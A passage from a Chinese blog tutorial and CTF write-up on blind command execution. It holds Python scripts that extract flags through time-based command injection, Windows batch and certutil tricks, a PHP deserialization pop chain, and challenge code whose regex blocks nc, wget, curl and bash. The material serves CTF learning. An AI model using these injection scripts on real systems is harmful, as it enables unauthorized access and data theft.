do (set /p =%%i&lt;nul)：对于每行从文件 "d:\c" 读取的文本，使用 set /p 命令将该行文本写入标准输出（屏幕）并通过 &lt;nul 重定向将其捕获。这实际上是将每行文本逐行写入标准输出，但没有显示在屏幕上。

&gt;"d:\d"：这部分将标准输出中的内容（即文件 "d:\c" 中的每一行文本）重定向到文件 "d:\d" 中，从而将文件 "d:\c" 中的内容逐行写入文件 "d:\d"。如果文件 "d:\d" 不存在，将创建它；如果已经存在，将覆盖其内容。</code></pre>
<p>先写入上面的bat去除换行符</p>
<pre><code class="hljs php">@<span class="hljs-keyword">echo</span> off					<span class="hljs-comment">#不打印输出</span>
findstr /b %<span class="hljs-number">1</span> <span class="hljs-string">"d:\d"</span>		<span class="hljs-comment">#%1是接收输入，"a.bat 123"这样123就会到%1这个位置</span>
<span class="hljs-comment">#/b是从头开始匹配</span>
IF ERRORLEVEL <span class="hljs-number">1</span> <span class="hljs-keyword">echo</span> a&amp;&amp;<span class="hljs-keyword">goto</span> end
<span class="hljs-comment">#ERRORLEVEL是类似错误号的东西，如果上面这个命令执行成功了就返回0，反之1,如果匹配不到的话这里就是1，然后goto跳到end，这里用goto原因是ERRORLEVEL不会传到下个命令，在下个命令看来IF ERRORLEVEL 1 echo a这个是执行成功的所以返回0，也会触发延迟，为了避免所以使用goto跳过</span>
IF ERRORLEVEL <span class="hljs-number">0</span> ping <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>
<span class="hljs-comment">#这里就是成功匹配返回0触发延迟</span>
:end</code></pre>
<p>然后再写入bat匹配字符串</p>
<pre><code class="hljs plaintext">a.bat 正确字符----延迟
a.bat 错误字符---不延迟</code></pre>
<p>同样用python写个脚本</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> string
command = <span class="hljs-string">"echo flag &gt;d:\\a"</span>
base64 = <span class="hljs-string">"certutil -encode d:\\a d:\\b"</span>
base64_clean = <span class="hljs-string">"findstr /V \"^---\" d:\\b &gt; d:\\c"</span>
echo_b_bat = <span class="hljs-string">"echo @echo off&gt;&gt;d:\\b.bat"</span>
echo_b_bat2 = <span class="hljs-string">"echo (for /f \"delims=\" %%i in ('type \"d:\\c\"') do (set /p =%%i^&lt;nul))^&gt;\"d:\\d\"&gt;&gt;d:\\b.bat"</span>
start = <span class="hljs-string">"d:\\b.bat"</span>

echo_a_bat = <span class="hljs-string">"echo @echo off&gt;&gt;d:\\a.bat"</span>
echo_a_bat1 = <span class="hljs-string">"echo findstr /b %1 \"d:\\d\"&gt;&gt;d:\\a.bat"</span>
echo_a_bat2 = <span class="hljs-string">"echo IF ERRORLEVEL 1 echo a^&amp;^&amp;goto end &gt;&gt;d:\\a.bat"</span>
echo_a_bat3 = <span class="hljs-string">"echo IF ERRORLEVEL 0 ping 127.0.0.1&gt;&gt;d:\\a.bat"</span>
echo_end = <span class="hljs-string">"echo :end&gt;&gt;d:\\a.bat"</span>


cmd = [command, base64, base64_clean,echo_b_bat, echo_b_bat2, start, echo_a_bat,echo_a_bat1,echo_a_bat2,echo_a_bat3,echo_end]
url = <span class="hljs-string">"http://127.0.0.1/system.php"</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> cmd:
    data = {
        <span class="hljs-string">"pass"</span>: i
    }
    requests.post(url, data=data)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"[+]init success"</span>)

bp = string.ascii_letters + string.digits + <span class="hljs-string">"+/="</span>
cmd_base64 = <span class="hljs-string">""</span>

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">65535</span>):
    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> bp:
        data = {
            <span class="hljs-string">"pass"</span>: <span class="hljs-string">"d:\\a.bat "</span> + cmd_base64 + s
        }
        response = requests.post(url, data=data)
        time = response.elapsed.total_seconds()
        <span class="hljs-keyword">if</span> time &gt; <span class="hljs-number">3</span>:
            cmd_base64 += s
            <span class="hljs-built_in">print</span>(cmd_base64)
            <span class="hljs-keyword">break</span></code></pre>
<p>下面是实例图片</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231028181910842.png" alt="image-20231028181910842"></p>
<h2 id="53-枚举flag">5.3 枚举flag</h2>
<p>服务器未联网，无写入权限。无法getshell等一系列操作，只能通过枚举/二分查找暴力查询flag。</p>
<p>构造脚本遍历：</p>
<pre><code class="hljs py"><span class="hljs-comment"># -*-coding:utf-8 -*-</span>
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> re

flag_format = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">'flag\\{[0-9a-z]{8}-[0-9a-z]{4}-[0-9a-z]{4}-[0-9a-z]{4}-[0-9a-z]{12}\\}'</span>)
all_letter = <span class="hljs-string">'-}0123456789abcdefghijklmnopqrstuvwxyz'</span>


<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag</span>(<span class="hljs-params">command</span>):
    <span class="hljs-keyword">try</span>:
        r = requests.get(<span class="hljs-string">'http://web.train.lilac.com:10008/'</span>, params={<span class="hljs-string">'command'</span>: command}, timeout=<span class="hljs-number">1.5</span>)
    <span class="hljs-keyword">except</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    flag = <span class="hljs-string">'flag{'</span>
    <span class="hljs-keyword">while</span> flag_format.<span class="hljs-keyword">match</span>(flag) == <span class="hljs-literal">None</span>:
        staus = <span class="hljs-number">0</span>
        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> all_letter:
            payload = <span class="hljs-string">'| cat /flag | grep %s &amp;&amp; sleep 1.8'</span> % (flag + i)
            <span class="hljs-built_in">print</span>(payload)
            <span class="hljs-keyword">if</span> get_flag(payload):
                staus = <span class="hljs-number">1</span>
                flag += i
                <span class="hljs-built_in">print</span>(flag)
                <span class="hljs-keyword">break</span>
        <span class="hljs-keyword">if</span> staus == <span class="hljs-number">0</span>:
            flag = flag[<span class="hljs-number">0</span>:-<span class="hljs-number">1</span>]</code></pre>
<h1 id="0x06-ctf题目实战">0x06 CTF题目实战</h1>
<h2 id="newstarctf-2023-week3-rce">NewStarCTF 2023 week3 RCE</h2>
<pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">minipop</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$qwejaskdjnlka</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\{|\}|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i'</span>, <span class="hljs-variable">$this</span>-&gt;code)){
            <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$this</span>-&gt;code);
        }
        <span class="hljs-keyword">return</span> <span class="hljs-string">"alright"</span>;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;qwejaskdjnlka;
    }
}
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'payload'</span>])){
    <span class="hljs-comment">//wanna try?</span>
    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'payload'</span>]);
}</code></pre>
<p>先是简单的反序列化，随后是一个无回显RCE的绕过，下面简单写一个pop链</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">minipop</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$qwejaskdjnlka</span>;
}

<span class="hljs-variable">$poc</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">minipop</span>();
<span class="hljs-variable">$poc</span>-&gt;qwejaskdjnlka = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">minipop</span>();
<span class="hljs-variable">$poc</span>-&gt;qwejaskdjnlka-&gt;code = <span class="hljs-string">'RCE'</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$poc</span>);

<span class="hljs-meta">?&gt;</span></code></pre>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> requests
url = <span class="hljs-string">"http://bcdad1a5-6014-4594-a8b5-c4c03f581147.node4.buuoj.cn:81/"</span>
result = <span class="hljs-string">""</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">15</span>):
    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):
        <span class="hljs-comment">#ascii码表</span>
        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):
            k=<span class="hljs-built_in">chr</span>(k)
            payload =<span class="hljs-string">f"if [ `cat /flag_is_h3eeere | awk NR==<span class="hljs-subst">{i}</span> | cut -c <span class="hljs-subst">{j}</span>` == '<span class="hljs-subst">{k}</span>' ];then sleep 2;fi"</span>
            length=<span class="hljs-built_in">len</span>(payload)
            payload2 ={
                <span class="hljs-string">"payload"</span>: <span class="hljs-string">'O:7:"minipop":2:{s:4:"code";N;s:13:"qwejaskdjnlka";O:7:"minipop":2:{s:4:"code";s:{0}:"{1}";s:13:"qwejaskdjnlka";N;}}'</span>.<span class="hljs-built_in">format</span>(length,payload)
            }
            t1=time.time()
            r=requests.post(url=url,data=payload2)
            t2=time.time()
            <span class="hljs-keyword">if</span> t2-t1 &gt;<span class="hljs-number">1.5</span>:
                result+=k
                <span class="hljs-built_in">print</span>(result)
    result += <span class="hljs-string">" "</span></code></pre>
<p>GPT对上述代码的解释</p>
<pre><code class="hljs plaintext">if [ ... ]; then sleep 2; fi：这是一个条件语句，其中包含一个条件测试。如果条件测试为真（true），则执行 sleep 2，即让脚本休眠2秒。这是一种时间延迟技巧，通常用于时间盲注攻击，攻击者根据服务端的响应时间来推断条件是否成立。

ls / | awk NR=={i} | cut -c {j}：这部分的目的是列出根目录 / 下的文件和目录，并使用 awk 和 cut 命令来选择其中一个字符。让我详细解释：

ls /：这部分列出了根目录下的文件和目录。

|：管道操作符，将 ls 命令的输出传递给下一个命令。

awk NR=={i}：这是一个 awk 命令，它根据行号 NR 是否等于 {i} 来选择特定行。{i} 是一个变量，它代表外部循环中的 i。
NR 是 AWK 命令中的一个特殊变量，表示当前正在处理的记录（行）的行号

|：再次使用管道操作符，将 awk 命令的输出传递给下一个命令。

cut -c {j}：这是 cut 命令，它根据字符位置 {j} 来选择特定字符。{j} 是一个变量，它代表内部循环中的 j。

== '{k}'：这部分是条件测试的一部分，它检查前面命令的输出字符是否等于变量 k，其中 k 是内部循环中的 ASCII 字符。</code></pre>
<p>这里我发现<code>"payload": 'O:7:"minipop":2:{s:4:"code";N;s:13:"qwejaskdjnlka";O:7:"minipop":2:{s:4:"code";s:{0}:"{1}";s:13:"qwejaskdjnlka";N;}}'.format(length,payload)</code></p>
<p>此处代码之间用了两对花括号</p>
<pre><code class="hljs plaintext">O:7:"minipop":2:{s:4:"code";N;s:13:"qwejaskdjnlka";O:7:"minipop":2:s:4:"code";s:0:"";s:13:"qwejaskdjnlka";N;}}</code></pre>
<p>这里我就疑问为何他用了两对括号，于是我用之前的先运行一下发现如下报错</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231029094253699.png" alt="image-20231029094253699"></p>
<p>如上图发现是keyerror错误，意思是字典格式的错误，csdn搜索了一下发现这个解释的很好</p>
<p>这次写的时候遇到了奇怪的KeyError。我一开始是这么写的：</p>
<pre><code class="hljs py">s = <span class="hljs-string">r'''</span>
<span class="hljs-string">function foo() {</span>
<span class="hljs-string">  printf("{}");</span>
<span class="hljs-string">}</span>
<span class="hljs-string">'''</span>.<span class="hljs-built_in">format</span>(arg)</code></pre>
<p>但是这样会报错。</p>
<p>后来发现，因为format自己用大括号作为占位符，如果字符串里本身有大括号，还得转义一下。具体怎么转义，就是用两个大括号，所以应该改成这样：</p>
<pre><code class="hljs py">s = <span class="hljs-string">r'''</span>
<span class="hljs-string">function foo() {{</span>
<span class="hljs-string">  printf("{}");</span>
<span class="hljs-string">}}</span>
<span class="hljs-string">'''</span>.<span class="hljs-built_in">format</span>(arg)</code></pre>
<p>这样才能正常输出。</p>
<p>之后再有类似的题我再更新吧，这次感觉只是简单了解了，似乎还是不熟练啊。</p>
<h1 id="0x07-参考文章">0x07 参考文章</h1>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/321428.html">无回显条件下的命令执行判断和利用方式研究</a> --实战类</p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/605695275">web-无回显的命令执行的5种反弹信道</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/cosmoslin/article/details/123039067">[CTF]命令执行无回显利用</a></p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1523441">CTF入门web篇18命令执行无回显的判断方法及dnslog相关例题</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kinyoobi/p/15415869.html">无回显的渗透技巧 </a></p>
<p><a target="_blank" rel="noopener" href="https://arsenetang.com/2021/07/23/RCE%E7%AF%87%E4%B9%8B%E6%97%A0%E5%9B%9E%E6%98%BErce/">RCE篇之无回显rce</a></p>
<p><a target="_blank" rel="noopener" href="https://www.macchiato.ink/web/web_security/Windows-Linux_RCE/">Windows/Linux下的无回显命令执行</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_63701832/article/details/129343487?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169845574216800215024655%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169845574216800215024655&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-129343487-null-null.142%5Ev96%5Epc_search_result_base4&amp;utm_term=%E6%97%A0%E5%9B%9E%E6%98%BE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&amp;spm=1018.2226.3001.4187">超全的命令（代码）执行漏洞无回显的姿势总结（附带详细代码和测试分析过程）</a></p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">hybcx</div><div class="post-copyright__author_desc">只需热爱, 未来可期！</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://hybcx.xyz/2023/10/28/wu-hui-xian-ming-ling-zhi-xing/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://hybcx.xyz/2023/10/28/wu-hui-xian-ming-ling-zhi-xing/')">无回显命令执行</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://hybcx.xyz/2023/10/28/wu-hui-xian-ming-ling-zhi-xing/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=无回显命令执行&amp;url=http://hybcx.xyz/2023/10/28/wu-hui-xian-ming-ling-zhi-xing/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://hybcx.xyz" target="_blank">hybcx</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>基本知识<span class="tagsPageCount">21</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/10/27/qian-xi-mysql-yu-chu-li/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">MySQL预处理绕过</div></div></a></div><div class="next-post pull-right"><a href="/2023/10/29/javascript-yuan-xing-lian-wu-ran/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">JavaScript原型链污染学习</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2023/07/27/ajax-xiang-jie/" title="Ajax详解"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-07-27</div><div class="title">Ajax详解</div></div></a></div><div><a href="/2023/11/12/flask-pin-ma-xue-xi/" title="Flask-PIN码学习"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-11-12</div><div class="title">Flask-PIN码学习</div></div></a></div><div><a href="/2023/08/06/docker-jian-jie/" title="docker基础"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-08-06</div><div class="title">docker基础</div></div></a></div><div><a href="/2024/02/27/jwt-gong-ji-xue-xi/" title="JWT攻击学习"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-02-27</div><div class="title">JWT攻击学习</div></div></a></div><div><a href="/2024/04/09/php-opcachegetshell/" title="PHP-OPcacheGetshell学习"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-04-09</div><div class="title">PHP-OPcacheGetshell学习</div></div></a></div><div><a href="/2023/11/13/phar-fan-xu-lie-hua-xue-xi/" title="Phar反序列化"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-11-13</div><div class="title">Phar反序列化</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">产品、设计、开发</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/about"><h1 class="author-info__name">hybcx</h1><div class="author-info__desc">只需热爱, 未来可期！</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hybchenxing" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/1761635300" target="_blank" title="Email"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="card-widget anzhiyu-right-widget" id="card-wechat" onclick="null"><div id="flip-wrapper"><div id="flip-content"><div class="face" style="background: url(https://bu.dusays.com/2023/01/13/63c02edf44033.png) center center / 100% no-repeat"></div><div class="back face" style="background: url(https://bu.dusays.com/2023/05/13/645fa415e8694.png) center center / 100% no-repeat"></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E6%97%A0%E5%9B%9E%E6%98%BE%E5%88%A4%E6%96%AD"><span class="toc-number">2.</span> <span class="toc-text">0x02 无回显判断</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-ctf%E5%9C%BA%E6%99%AF"><span class="toc-number">3.</span> <span class="toc-text">0x03 CTF场景</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">4.</span> <span class="toc-text">0x04 绕过方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#41-%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">4.1.</span> <span class="toc-text">4.1 反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#42-dns%E5%A4%96%E5%B8%A6"><span class="toc-number">4.2.</span> <span class="toc-text">4.2 DNS外带</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#43-http%E8%AF%B7%E6%B1%82"><span class="toc-number">4.3.</span> <span class="toc-text">4.3 http请求</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#44-%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E9%9C%80%E8%A6%81%E7%AB%99%E7%82%B9%E7%9B%AE%E5%BD%95%E5%85%B7%E6%9C%89%E5%86%99%E6%9D%83%E9%99%90"><span class="toc-number">4.4.</span> <span class="toc-text">4.4 执行命令（需要站点目录具有写权限）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#45-%E7%9B%B4%E6%8E%A5%E5%86%99%E5%85%A5%E6%88%96%E5%A4%96%E9%83%A8%E4%B8%8B%E8%BD%BDwebshell"><span class="toc-number">4.5.</span> <span class="toc-text">4.5 直接写入或外部下载webshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#46-nc%E5%A4%96%E5%B8%A6"><span class="toc-number">4.6.</span> <span class="toc-text">4.6 nc外带</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#47-http%E5%A4%96%E5%B8%A6"><span class="toc-number">4.7.</span> <span class="toc-text">4.7 http外带</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#48-%E5%9C%A8vps%E4%B8%8A%E5%BB%BA%E7%AB%8B%E8%AE%B0%E5%BD%95%E8%84%9A%E6%9C%AC"><span class="toc-number">4.8.</span> <span class="toc-text">4.8 在vps上建立记录脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#49-burpcollaborator-client"><span class="toc-number">4.9.</span> <span class="toc-text">4.9 burp(Collaborator Client)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-py%E8%84%9A%E6%9C%AC%E8%BF%9B%E9%98%B6"><span class="toc-number">5.</span> <span class="toc-text">0x05 py脚本（进阶）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#51-linux"><span class="toc-number">5.1.</span> <span class="toc-text">5.1 Linux</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#52-windows"><span class="toc-number">5.2.</span> <span class="toc-text">5.2 Windows</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#53-%E6%9E%9A%E4%B8%BEflag"><span class="toc-number">5.3.</span> <span class="toc-text">5.3 枚举flag</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" 